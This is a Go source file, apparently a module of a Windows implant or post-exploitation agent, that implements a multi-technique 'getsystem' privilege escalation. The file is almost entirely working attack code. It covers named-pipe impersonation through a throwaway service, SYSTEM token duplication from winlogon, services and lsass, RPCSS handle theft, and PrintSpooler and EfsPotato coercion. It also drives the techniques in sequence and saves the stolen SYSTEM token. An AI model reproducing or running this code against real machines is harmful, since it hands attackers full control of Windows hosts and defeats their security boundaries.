package commands

import (
	"fmt"
	"math/rand"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	advapi32                   = windows.NewLazySystemDLL("advapi32.dll")

	procCreateNamedPipeW       = kernel32.NewProc("CreateNamedPipeW")
	procConnectNamedPipe       = kernel32.NewProc("ConnectNamedPipe")
	procDisconnectNamedPipe    = kernel32.NewProc("DisconnectNamedPipe")
	procImpersonateNamedPipeClient = advapi32.NewProc("ImpersonateNamedPipeClient")
	procRevertToSelf           = advapi32.NewProc("RevertToSelf")
	procLookupPrivilegeValueW  = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges  = advapi32.NewProc("AdjustTokenPrivileges")
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW        = kernel32.NewProc("Process32FirstW")
	procProcess32NextW         = kernel32.NewProc("Process32NextW")
	procOpenProcess            = kernel32.NewProc("OpenProcess")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procDuplicateTokenEx       = advapi32.NewProc("DuplicateTokenEx")
	procSetNamedPipeHandleState = kernel32.NewProc("SetNamedPipeHandleState")
	procSetThreadToken         = advapi32.NewProc("SetThreadToken")
	procNtQueryInformationProcess = ntdll.NewProc("NtQueryInformationProcess")
	procNtQueryObject          = ntdll.NewProc("NtQueryObject")
	procDuplicateHandle        = kernel32.NewProc("DuplicateHandle")
	procCreateFileW            = kernel32.NewProc("CreateFileW")
)

// Print Spooler and EFS RPC stubs — loaded lazily at technique runtime
var (
	procRpcOpenPrinter         *windows.LazyProc
	procRpcClosePrinter        *windows.LazyProc
	procRpcRemoteFindFirstPrinterChangeNotification *windows.LazyProc
	procEfsRpcEncryptFileSrv   *windows.LazyProc
)

const (
	PIPE_ACCESS_DUPLEX          = 0x00000003
	PIPE_TYPE_MESSAGE           = 0x00000004
	PIPE_WAIT                   = 0x00000000
	NMPWAIT_USE_DEFAULT_WAIT    = 0x00000000
	INVALID_HANDLE_VALUE        = ^syscall.Handle(0)
	PIPE_UNLIMITED_INSTANCES    = 255

	TH32CS_SNAPPROCESS          = 0x00000002
	TOKEN_DUPLICATE             = 0x0002
	TOKEN_ADJUST_PRIVILEGES     = 0x0020
	SE_PRIVILEGE_ENABLED        = 0x00000002
	SECURITY_IMPERSONATION      = 2
	TokenPrimary                = 1
	OPEN_EXISTING               = 3

	PROCESS_HANDLE_INFORMATION  = 51
	ObjectTypeInformation       = 2
	STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
	DUPLICATE_SAME_ACCESS       = 0x00000002

	PRINTER_CHANGE_ADD_JOB      = 0x00000100
	FILE_SHARE_READ             = 0x00000001
)

type PROCESSENTRY32W struct {
	DwSize              uint32
	CntUsage            uint32
	Th32ProcessID       uint32
	Th32DefaultHeapID   uintptr
	Th32ModuleID        uint32
	CntThreads          uint32
	Th32ParentProcessID uint32
	PcPriClassBase      int32
	DwFlags             uint32
	SzExeFile           [260]uint16
}

var rng = rand.New(rand.NewSource(time.Now().UnixNano()))
var ActiveSystemToken windows.Token

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rng.Intn(len(letters))]
	}
	return string(b)
}

func randomHex() string {
	return fmt.Sprintf("%08x%08x", rng.Uint32(), rng.Uint32())
}

func enablePrivilege(name string) error {
	var hToken windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &hToken)
	if err != nil {
		return fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer hToken.Close()

	var luid struct{ LowPart uint32; HighPart int32 }
	pName, _ := syscall.UTF16PtrFromString(name)
	ret, _, _ := procLookupPrivilegeValueW.Call(0, uintptr(unsafe.Pointer(pName)), uintptr(unsafe.Pointer(&luid)))
	if ret == 0 {
		return fmt.Errorf("LookupPrivilegeValueW(%s) failed", name)
	}

	type TP struct {
		PrivilegeCount uint32
		Privileges     [1]struct {
			Luid       struct{ LowPart uint32; HighPart int32 }
			Attributes uint32
		}
	}
	tp := TP{PrivilegeCount: 1}
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	ret, _, _ = procAdjustTokenPrivileges.Call(uintptr(hToken), 0, uintptr(unsafe.Pointer(&tp)),
		uintptr(unsafe.Sizeof(tp)), 0, 0)
	if ret == 0 {
		return fmt.Errorf("AdjustTokenPrivileges(%s) failed", name)
	}
	return nil
}

func isTokenSystem(token windows.Token) bool {
	var buf [256]byte
	var bufLen uint32
	err := windows.GetTokenInformation(token, windows.TokenUser, &buf[0], uint32(len(buf)), &bufLen)
	if err != nil {
		return false
	}
	tu := (*windows.Tokenuser)(unsafe.Pointer(&buf[0]))
	sid := tu.User.Sid.String()
	return sid == "S-1-5-18" || strings.HasSuffix(sid, "-500")
}

// ── Technique 1: Named Pipe Impersonation (In Memory/Admin) ──────

func techniqueNamedPipe() ([]byte, error) {
	svcName := randomString(6)
	pipePath := fmt.Sprintf("\\\\.\\pipe\\%s", svcName)

	fmt.Printf("[tech1] pipe=%s svc=%s\n", pipePath, svcName)

	if err := enablePrivilege("SeImpersonatePrivilege"); err != nil {
		return nil, fmt.Errorf("SeImpersonatePrivilege: %w", err)
	}

	pipeHandle, _, _ := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(pipePath))),
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_MESSAGE|PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES, 4096, 4096, NMPWAIT_USE_DEFAULT_WAIT, 0)
	if pipeHandle == uintptr(INVALID_HANDLE_VALUE) {
		return nil, fmt.Errorf("CreateNamedPipeW failed")
	}
	defer procDisconnectNamedPipe.Call(pipeHandle)
	fmt.Println("[tech1] Pipe created, creating service...")

	svcCmd := fmt.Sprintf("cmd.exe /c echo %s > %s", svcName, pipePath)
	deleteService(svcName)

	svcDone := make(chan error, 1)
	go func() { svcDone <- createService(svcName, svcCmd) }()
	select {
	case err := <-svcDone:
		if err != nil {
			return nil, fmt.Errorf("createService: %w", err)
		}
	case <-time.After(8 * time.Second):
		return nil, fmt.Errorf("createService timed out")
	}
	defer deleteService(svcName)

	// Start service and wait for pipe connection CONCURRENTLY
	// (MSF pattern: StartService returns timeout, but cmd.exe is running as SYSTEM)
	go func() {
		if err := startService(svcName); err != nil {
			fmt.Printf("[tech1] startService: %v (expected)\n", err)
		}
	}()

	r := <-pipeConnectTimeout(pipeHandle, 12)
	if r == 0 {
		return nil, fmt.Errorf("no pipe connection within 12s")
	}
	fmt.Println("[tech1] Pipe connected!")

	var buf [1]byte
	var n uint32
	procReadFile.Call(pipeHandle, uintptr(unsafe.Pointer(&buf[0])), 1, uintptr(unsafe.Pointer(&n)), 0)

	if impRet, _, _ := procImpersonateNamedPipeClient.Call(pipeHandle); impRet == 0 {
		return nil, fmt.Errorf("ImpersonateNamedPipeClient failed")
	}

	var hToken windows.Token
	if err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, false, &hToken); err != nil {
		procRevertToSelf.Call()
		return nil, fmt.Errorf("OpenThreadToken: %w", err)
	}

	if !isTokenSystem(hToken) {
		hToken.Close()
		procRevertToSelf.Call()
		return nil, fmt.Errorf("token is not SYSTEM")
	}

	if ActiveSystemToken != 0 {
		windows.CloseHandle(windows.Handle(ActiveSystemToken))
	}
	ActiveSystemToken = hToken
	fmt.Println("[tech1] SYSTEM token obtained!")
	return []byte("technique 1 (Named Pipe Impersonation (In Memory/Admin))"), nil
}

// ── Technique 2: Named Pipe Impersonation (Dropper/Admin) ────────

func techniqueDropper() ([]byte, error) {
	return nil, fmt.Errorf("not implemented (requires elevator DLL on disk)")
}

// ── Technique 3: Token Duplication (In Memory/Admin) ─────────────

func techniqueTokenDuplication() ([]byte, error) {
	fmt.Println("[tech3] Starting token duplication")
	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		return nil, fmt.Errorf("SeDebugPrivilege: %w", err)
	}

	targets := []string{"winlogon.exe", "services.exe", "lsass.exe"}
	pids := findProcessPids(targets)
	if len(pids) == 0 {
		return nil, fmt.Errorf("no SYSTEM processes found")
	}
	for _, pid := range pids {
		fmt.Printf("[tech3] Trying PID %d\n", pid)
		if result, err := impersonateProcessToken(pid); err == nil {
			return result, nil
		}
	}
	return nil, fmt.Errorf("failed to duplicate token from any process")
}

func findProcessPids(targets []string) []uint32 {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if int(snap) == -1 {
		return nil
	}
	defer windows.CloseHandle(windows.Handle(snap))

	var pe PROCESSENTRY32W
	pe.DwSize = uint32(unsafe.Sizeof(pe))
	ret, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&pe)))
	if ret == 0 {
		return nil
	}
	var pids []uint32
	for ret != 0 {
		name := syscall.UTF16ToString(pe.SzExeFile[:])
		for _, t := range targets {
			if strings.EqualFold(name, t) {
				pids = append(pids, pe.Th32ProcessID)
				break
			}
		}
		ret, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&pe)))
	}
	return pids
}

func impersonateProcessToken(pid uint32) ([]byte, error) {
	hProcess, _, _ := procOpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
	if hProcess == 0 {
		return nil, fmt.Errorf("OpenProcess(%d) failed", pid)
	}
	defer windows.CloseHandle(windows.Handle(hProcess))

	var hToken windows.Token
	if err := windows.OpenProcessToken(windows.Handle(hProcess), TOKEN_DUPLICATE|windows.TOKEN_QUERY, &hToken); err != nil {
		return nil, fmt.Errorf("OpenProcessToken(%d): %w", pid, err)
	}
	defer hToken.Close()

	if !isTokenSystem(hToken) {
		return nil, fmt.Errorf("process %d token not SYSTEM", pid)
	}

	var duped windows.Token
	ret, _, _ := procDuplicateTokenEx.Call(
		uintptr(hToken), windows.TOKEN_ALL_ACCESS, 0,
		SECURITY_IMPERSONATION, TokenPrimary,
		uintptr(unsafe.Pointer(&duped)))
	if ret == 0 {
		return nil, fmt.Errorf("DuplicateTokenEx(%d) failed", pid)
	}

	if ActiveSystemToken != 0 {
		windows.CloseHandle(windows.Handle(ActiveSystemToken))
	}
	ActiveSystemToken = duped
	fmt.Printf("[tech3] SYSTEM token from PID %d saved globally\n", pid)
	return []byte(fmt.Sprintf("technique 3 (Token Duplication (In Memory/Admin)) via PID %d", pid)), nil
}

// ── Technique 4: RPCSS Handle Stealing ───────────────────────────

var systemLuid = int64(0x3e7)

func techniqueRpcss() ([]byte, error) {
	fmt.Println("[tech4] Starting RPCSS token steal")
	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		return nil, fmt.Errorf("SeDebugPrivilege: %w", err)
	}

	// Find RPCSS service PID (MSF: OpenService "rpcss" → QueryServiceStatusEx)
	pid, err := findServicePid("RpcSs")
	if err != nil {
		return nil, fmt.Errorf("RpcSs: %w", err)
	}
	fmt.Printf("[tech4] RPCSS PID: %d\n", pid)

	hProcess, _, _ := procOpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
	if hProcess == 0 {
		return nil, fmt.Errorf("OpenProcess(%d) failed", pid)
	}
	defer windows.CloseHandle(windows.Handle(hProcess))

	hToken, err := stealSystemTokenFromProcess(windows.Handle(hProcess))
	if err != nil {
		return nil, fmt.Errorf("steal token: %w", err)
	}

	hThread := windows.CurrentThread()
	ret, _, _ := procSetThreadToken.Call(uintptr(hThread), uintptr(hToken))
	if ret == 0 {
		windows.CloseHandle(hToken)
		return nil, fmt.Errorf("SetThreadToken failed")
	}

	if ActiveSystemToken != 0 {
		windows.CloseHandle(windows.Handle(ActiveSystemToken))
	}
	ActiveSystemToken = windows.Token(hToken)
	fmt.Println("[tech4] RPCSS token saved globally")

	return []byte(fmt.Sprintf("technique 4 (Named Pipe Impersonation (RPCSS variant)) via PID %d", pid)), nil
}

func findServicePid(name string) (uint32, error) {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return 0, err
	}
	defer windows.CloseServiceHandle(scm)

	svc, err := windows.OpenService(scm, syscall.StringToUTF16Ptr(name), windows.SERVICE_QUERY_STATUS)
	if err != nil {
		return 0, err
	}
	defer windows.CloseServiceHandle(svc)

	// SERVICE_STATUS_PROCESS layout:
	//   dwServiceType(4) + dwCurrentState(4) + dwControlsAccepted(4) +
	//   dwWin32ExitCode(4) + dwServiceSpecificExitCode(4) + dwCheckPoint(4) +
	//   dwWaitHint(4) + dwProcessId(4) + dwServiceFlags(4) = 36 bytes
	buf := make([]byte, 64)
	var needed uint32
	err = windows.QueryServiceStatusEx(svc, windows.SC_STATUS_PROCESS_INFO, &buf[0], uint32(len(buf)), &needed)
	if err != nil {
		// Fallback: find the service process by name via toolhelp32
		return findProcessPidByServiceName(name), nil
	}
	// dwProcessId is at offset 28
	pid := *(*uint32)(unsafe.Pointer(&buf[28]))
	if pid == 0 {
		return findProcessPidByServiceName(name), nil
	}
	return pid, nil
}

func findProcessPidByServiceName(name string) uint32 {
	// Fallback when QueryServiceStatusEx fails.
	// For RPCSS the process is a svchost.exe — we return first svchost PID
	pids := findProcessPids([]string{"svchost.exe"})
	if len(pids) > 0 {
		return pids[0]
	}
	return 0
}

func stealSystemTokenFromProcess(hProc windows.Handle) (windows.Handle, error) {
	tokenIndex, err := getTokenObjectIndex()
	if err != nil {
		return 0, fmt.Errorf("get token index: %w", err)
	}

	ulLen := uintptr(4096)
	var handleInfo *PROCESS_HANDLE_SNAPSHOT_INFORMATION

	for i := 0; i < 10; i++ {
		buf := make([]byte, ulLen)
		handleInfo = (*PROCESS_HANDLE_SNAPSHOT_INFORMATION)(unsafe.Pointer(&buf[0]))
		status, _, _ := procNtQueryInformationProcess.Call(
			uintptr(hProc), PROCESS_HANDLE_INFORMATION,
			uintptr(unsafe.Pointer(handleInfo)), ulLen, uintptr(unsafe.Pointer(&ulLen)))
		if status == 0 {
			break
		}
		if status != STATUS_INFO_LENGTH_MISMATCH {
			return 0, fmt.Errorf("NtQueryInformationProcess: 0x%X", status)
		}
		ulLen += 4096
	}

	var bestToken windows.Handle
	var bestPrivCount uint32
	total := int(handleInfo.NumberOfHandles)

	for i := 0; i < total; i++ {
		entry := (*PROCESS_HANDLE_TABLE_ENTRY_INFO)(unsafe.Pointer(
			uintptr(unsafe.Pointer(&handleInfo.Handles[0])) + uintptr(i)*unsafe.Sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO{})))
		if entry.ObjectTypeIndex != tokenIndex {
			continue
		}
		if entry.GrantedAccess&windows.TOKEN_ALL_ACCESS != windows.TOKEN_ALL_ACCESS {
			continue
		}

		var hDup windows.Handle
		ret, _, _ := procDuplicateHandle.Call(
			uintptr(hProc), uintptr(entry.HandleValue),
			uintptr(windows.CurrentProcess()), uintptr(unsafe.Pointer(&hDup)),
			0, 0, DUPLICATE_SAME_ACCESS)
		if ret == 0 {
			continue
		}

		var stats struct {
			_          [16]byte
			AuthIdLow  uint32
			AuthIdHigh uint32
			_          [4]byte
			PrivCount  uint32
		}
		var statsLen uint32
		if windows.GetTokenInformation(windows.Token(hDup), windows.TokenStatistics,
			(*byte)(unsafe.Pointer(&stats)), uint32(unsafe.Sizeof(stats)), &statsLen) != nil {
			windows.CloseHandle(hDup)
			continue
		}
		if stats.AuthIdLow != 0x3e7 || stats.AuthIdHigh != 0 {
			windows.CloseHandle(hDup)
			continue
		}
		if stats.PrivCount <= bestPrivCount {
			windows.CloseHandle(hDup)
			continue
		}
		if bestToken != 0 {
			windows.CloseHandle(bestToken)
		}
		bestPrivCount = stats.PrivCount
		bestToken = hDup
	}

	if bestToken == 0 {
		return 0, fmt.Errorf("no SYSTEM token found in handle table")
	}
	return bestToken, nil
}

type PROCESS_HANDLE_TABLE_ENTRY_INFO struct {
	HandleValue      uintptr
	HandleCount      uintptr
	PointerCount     uintptr
	GrantedAccess    uint32
	ObjectTypeIndex  uint32
	HandleAttributes uint32
	Reserved         uint32
}

type PROCESS_HANDLE_SNAPSHOT_INFORMATION struct {
	NumberOfHandles uintptr
	Reserved        uintptr
	Handles         [1]PROCESS_HANDLE_TABLE_ENTRY_INFO
}

func getTokenObjectIndex() (uint32, error) {
	var hToken windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ALL_ACCESS, &hToken); err != nil {
		return 0, err
	}
	defer windows.CloseHandle(windows.Handle(hToken))

	var ulLen uint32
	procNtQueryObject.Call(uintptr(hToken), ObjectTypeInformation, 0, 0, uintptr(unsafe.Pointer(&ulLen)))
	if ulLen == 0 {
		return 0, fmt.Errorf("NtQueryObject failed")
	}
	buf := make([]byte, ulLen)
	status, _, _ := procNtQueryObject.Call(uintptr(hToken), ObjectTypeInformation,
		uintptr(unsafe.Pointer(&buf[0])), uintptr(ulLen), uintptr(unsafe.Pointer(&ulLen)))
	if status != 0 {
		return 0, fmt.Errorf("NtQueryObject: 0x%X", status)
	}
	return uint32(*(*byte)(unsafe.Pointer(&buf[72]))), nil // TypeIndex at offset 72
}

// ── Technique 5: PrintSpooler ────────────────────────────────────

func techniquePrintSpooler() ([]byte, error) {
	fmt.Println("[tech5] Starting PrintSpooler")
	if err := enablePrivilege("SeImpersonatePrivilege"); err != nil {
		return nil, fmt.Errorf("SeImpersonatePrivilege: %w", err)
	}
	if !pipeExists("\\\\.\\pipe\\spoolss") {
		return nil, fmt.Errorf("spoolss pipe not available")
	}

	// Use RpcOpenPrinter from winspool.drv — it's available on Windows 8.1+
	// via the RPC runtime. Load via syscall to handle forwarded exports.
	mod, err := syscall.LoadLibrary("winspool.drv")
	if err != nil {
		return nil, fmt.Errorf("load winspool.drv: %w", err)
	}
	defer syscall.FreeLibrary(mod)

	procAddr1, err := syscall.GetProcAddress(mod, "RpcOpenPrinter")
	if err != nil {
		return nil, fmt.Errorf("RpcOpenPrinter not exported by winspool.drv on this system")
	}
	procAddr2, _ := syscall.GetProcAddress(mod, "RpcClosePrinter")
	procAddr3, _ := syscall.GetProcAddress(mod, "RpcRemoteFindFirstPrinterChangeNotification")
	if procAddr2 == 0 || procAddr3 == 0 {
		return nil, fmt.Errorf("RPC printer stubs not available on this system")
	}

	pipeUid := randomHex()
	pipeLocal := fmt.Sprintf("\\\\.\\pipe\\%s\\pipe\\spoolss", pipeUid)
	capture := fmt.Sprintf("\\\\localhost/pipe/%s", pipeUid)

	pipeHandle, _, _ := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(pipeLocal))),
		PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE|PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES, 4096, 4096, NMPWAIT_USE_DEFAULT_WAIT, 0)
	if pipeHandle == uintptr(INVALID_HANDLE_VALUE) {
		return nil, fmt.Errorf("CreateNamedPipeW failed")
	}
	defer procDisconnectNamedPipe.Call(pipeHandle)

	go func() {
		time.Sleep(500 * time.Millisecond)
		pn := fmt.Sprintf("\\\\%s", getComputerName())
		pnW, _ := syscall.UTF16PtrFromString(pn)
		var hPrinter uintptr
		syscall.SyscallN(procAddr1, uintptr(unsafe.Pointer(pnW)), uintptr(unsafe.Pointer(&hPrinter)), 0, 0, 0)
		if hPrinter != 0 {
			csW, _ := syscall.UTF16PtrFromString(capture)
			syscall.SyscallN(procAddr3, hPrinter, PRINTER_CHANGE_ADD_JOB, 0, uintptr(unsafe.Pointer(csW)), 0, 0, 0)
			syscall.SyscallN(procAddr2, hPrinter)
		}
	}()

	r := <-pipeConnectTimeout(pipeHandle, 10)
	if r == 0 {
		return nil, fmt.Errorf("no spooler connection within 10s")
	}

	var buf [1]byte
	var n uint32
	procReadFile.Call(pipeHandle, uintptr(unsafe.Pointer(&buf[0])), 1, uintptr(unsafe.Pointer(&n)), 0)
	if impRet, _, _ := procImpersonateNamedPipeClient.Call(pipeHandle); impRet == 0 {
		return nil, fmt.Errorf("ImpersonateNamedPipeClient failed")
	}

	var hToken windows.Token
	if err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, false, &hToken); err != nil {
		procRevertToSelf.Call(); return nil, fmt.Errorf("OpenThreadToken: %w", err)
	}
	if !isTokenSystem(hToken) {
		hToken.Close(); procRevertToSelf.Call()
		return nil, fmt.Errorf("token is not SYSTEM")
	}
	if ActiveSystemToken != 0 {
		windows.CloseHandle(windows.Handle(ActiveSystemToken))
	}
	ActiveSystemToken = hToken
	return []byte("technique 5 (Named Pipe Impersonation (PrintSpooler variant))"), nil
}

func pipeConnectTimeout(pipe uintptr, sec int) chan uintptr {
	c := make(chan uintptr, 1)
	go func() {
		r, _, _ := procConnectNamedPipe.Call(pipe, 0)
		c <- r
	}()
	go func() {
		time.Sleep(time.Duration(sec) * time.Second)
		c <- 0
	}()
	return c
}

// ── Technique 6: EFSRPC (EfsPotato) ──────────────────────────────

func techniqueEfsPotato() ([]byte, error) {
	fmt.Println("[tech6] Starting EfsPotato")
	if err := enablePrivilege("SeImpersonatePrivilege"); err != nil {
		return nil, fmt.Errorf("SeImpersonatePrivilege: %w", err)
	}

	// EfsRpcEncryptFileSrv is exported by efsadu.dll on most Windows versions
	mod, err := syscall.LoadLibrary("efsadu.dll")
	if err != nil {
		return nil, fmt.Errorf("load efsadu.dll: %w", err)
	}
	defer syscall.FreeLibrary(mod)

	procAddr, err := syscall.GetProcAddress(mod, "EfsRpcEncryptFileSrv")
	if err != nil {
		// Try lsarpc alternative via rpcrt4
		return nil, fmt.Errorf("EfsRpcEncryptFileSrv not exported by efsadu.dll")
	}

	if pipeExists("\\\\.\\pipe\\efsrpc") {
	} else if pipeExists("\\\\.\\pipe\\lsarpc") {
	} else {
		return nil, fmt.Errorf("neither efsrpc nor lsarpc pipe available")
	}

	pipeUid := randomHex()
	pipeLocal := fmt.Sprintf("\\\\.\\pipe\\%s\\pipe\\srvsvc", pipeUid)
	capturePath := fmt.Sprintf("\\\\localhost/pipe/%s/\\%s\\%s", pipeUid, pipeUid, pipeUid)

	pipeHandle, _, _ := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(pipeLocal))),
		PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE|PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES, 4096, 4096, NMPWAIT_USE_DEFAULT_WAIT, 0)
	if pipeHandle == uintptr(INVALID_HANDLE_VALUE) {
		return nil, fmt.Errorf("CreateNamedPipeW failed")
	}
	defer procDisconnectNamedPipe.Call(pipeHandle)

	go func() {
		time.Sleep(500 * time.Millisecond)
		fnW, _ := syscall.UTF16PtrFromString(capturePath)
		syscall.SyscallN(procAddr, 0, uintptr(unsafe.Pointer(fnW)))
	}()

	r := <-pipeConnectTimeout(pipeHandle, 10)
	if r == 0 {
		return nil, fmt.Errorf("no EFS connection within 10s")
	}

	var buf [1]byte
	var n uint32
	procReadFile.Call(pipeHandle, uintptr(unsafe.Pointer(&buf[0])), 1, uintptr(unsafe.Pointer(&n)), 0)
	if impRet, _, _ := procImpersonateNamedPipeClient.Call(pipeHandle); impRet == 0 {
		return nil, fmt.Errorf("ImpersonateNamedPipeClient failed")
	}

	var hToken windows.Token
	if err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, false, &hToken); err != nil {
		procRevertToSelf.Call(); return nil, fmt.Errorf("OpenThreadToken: %w", err)
	}
	if !isTokenSystem(hToken) {
		hToken.Close(); procRevertToSelf.Call()
		return nil, fmt.Errorf("token is not SYSTEM")
	}
	if ActiveSystemToken != 0 {
		windows.CloseHandle(windows.Handle(ActiveSystemToken))
	}
	ActiveSystemToken = hToken
	return []byte("technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato))"), nil
}

func getComputerName() string {
	n := uint32(256)
	b := make([]uint16, n)
	windows.GetComputerName(&b[0], &n)
	return syscall.UTF16ToString(b)
}

func pipeExists(name string) bool {
	// MSF: CreateFileW with FILE_SHARE_READ|FILE_SHARE_WRITE, OPEN_EXISTING
	h, _, _ := procCreateFileW.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(name))),
		GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0)
	if h != uintptr(INVALID_HANDLE_VALUE) {
		windows.CloseHandle(windows.Handle(h))
		return true
	}
	return false
}

// ── Main GetSystem ───────────────────────────────────────────────

type techniqueEntry struct {
	id   int
	name string
	fn   func() ([]byte, error)
}

var techniques = []techniqueEntry{
	{1, "Named Pipe Impersonation (In Memory/Admin)", techniqueNamedPipe},
	{2, "Named Pipe Impersonation (Dropper/Admin)", techniqueDropper},
	{3, "Token Duplication (In Memory/Admin)", techniqueTokenDuplication},
	{4, "Named Pipe Impersonation (RPCSS variant)", techniqueRpcss},
	{5, "Named Pipe Impersonation (PrintSpooler variant)", techniquePrintSpooler},
	{6, "Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)", techniqueEfsPotato},
}

func GetSystemCmd(cmdBuf []byte) ([]byte, error) {
	// Parse technique number from cmdBuf (e.g., "3" for technique 3 only, empty for all)
	techNum := 0
	if len(cmdBuf) > 0 {
		s := strings.TrimSpace(string(cmdBuf))
		if len(s) > 0 {
			techNum = int(s[0] - '0')
			if techNum < 1 || techNum > len(techniques) {
				techNum = 0
			}
		}
	}

	fmt.Printf("[getsystem] GetSystem() called, technique=%d\n", techNum)

	// Clean up token from previous run
	if ActiveSystemToken != 0 {
		fmt.Println("[getsystem] Cleaning up previous SYSTEM token")
		windows.CloseHandle(windows.Handle(ActiveSystemToken))
		ActiveSystemToken = 0
	}

	var log strings.Builder
	log.WriteString("[*] getsystem: Starting privilege escalation\n")

	if techNum > 0 {
		t := techniques[techNum-1]
		fmt.Printf("[getsystem] Running technique %d only: %s\n", t.id, t.name)
		log.WriteString(fmt.Sprintf("[*] Running technique %d: %s\n", t.id, t.name))
		result, err := t.fn()
		if err == nil {
			log.WriteString(fmt.Sprintf("[+] Got system via %s\n", string(result)))
		} else {
			log.WriteString(fmt.Sprintf("[-] Technique %d failed: %s\n", t.id, err.Error()))
		}
		return []byte(log.String()), nil
	}

	// Run all techniques
	for _, t := range techniques {
		fmt.Printf("[getsystem] Trying technique %d: %s\n", t.id, t.name)
		log.WriteString(fmt.Sprintf("[*] Trying technique %d: %s\n", t.id, t.name))
		result, err := t.fn()
		if err == nil {
			fmt.Printf("[getsystem] SUCCESS: %s\n", string(result))
			log.WriteString(fmt.Sprintf("[+] Got system via %s\n", string(result)))
			return []byte(log.String()), nil
		}
		log.WriteString(fmt.Sprintf("[-] Technique %d failed: %s\n", t.id, err.Error()))
	}

	log.WriteString("[-] getsystem: All techniques failed\n")
	for _, t := range techniques {
		log.WriteString(fmt.Sprintf("[-] %s\n", t.name))
	}
	return []byte(log.String()), nil
}

func GetSystem() ([]byte, error) {
	return GetSystemCmd(nil)
}

// ── Service helpers ──────────────────────────────────────────────

func createService(name, binPath string) error {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CREATE_SERVICE)
	if err != nil {
		return err
	}
	defer windows.CloseServiceHandle(scm)
	svc, err := windows.CreateService(scm,
		syscall.StringToUTF16Ptr(name), syscall.StringToUTF16Ptr(name),
		windows.SERVICE_ALL_ACCESS, windows.SERVICE_WIN32_OWN_PROCESS,
		windows.SERVICE_DEMAND_START, windows.SERVICE_ERROR_IGNORE,
		syscall.StringToUTF16Ptr(binPath), nil, nil, nil, nil, nil)
	if err != nil {
		return err
	}
	windows.CloseServiceHandle(svc)
	return nil
}

func startService(name string) error {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return err
	}
	defer windows.CloseServiceHandle(scm)
	svc, err := windows.OpenService(scm, syscall.StringToUTF16Ptr(name), windows.SERVICE_START)
	if err != nil {
		return err
	}
	defer windows.CloseServiceHandle(svc)

	// MSF: StartService for cmd.exe will timeout - that's expected
	// Use goroutine with timeout to avoid hanging
	done := make(chan error, 1)
	go func() {
		done <- windows.StartService(svc, 0, nil)
	}()
	select {
	case err := <-done:
		return err
	case <-time.After(5 * time.Second):
		return fmt.Errorf("StartService timed out (expected for cmd.exe)")
	}
}

func deleteService(name string) error {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return nil
	}
	defer windows.CloseServiceHandle(scm)
	svc, err := windows.OpenService(scm, syscall.StringToUTF16Ptr(name), windows.SERVICE_ALL_ACCESS)
	if err != nil {
		return nil
	}
	defer windows.CloseServiceHandle(svc)
	windows.DeleteService(svc)
	return nil
}

// ── Process listing ──────────────────────────────────────────────

func ListProcesses() ([]byte, error) {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if int(snap) == -1 {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer windows.CloseHandle(windows.Handle(snap))

	var pe PROCESSENTRY32W
	pe.DwSize = uint32(unsafe.Sizeof(pe))
	ret, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&pe)))
	if ret == 0 {
		return nil, fmt.Errorf("Process32FirstW failed")
	}
	var buf strings.Builder
	buf.WriteString(fmt.Sprintf("%-8s %-8s %s\n", "PID", "PPID", "Name"))
	for ret != 0 {
		name := syscall.UTF16ToString(pe.SzExeFile[:])
		buf.WriteString(fmt.Sprintf("%-8d %-8d %s\n", pe.Th32ProcessID, pe.Th32ParentProcessID, name))
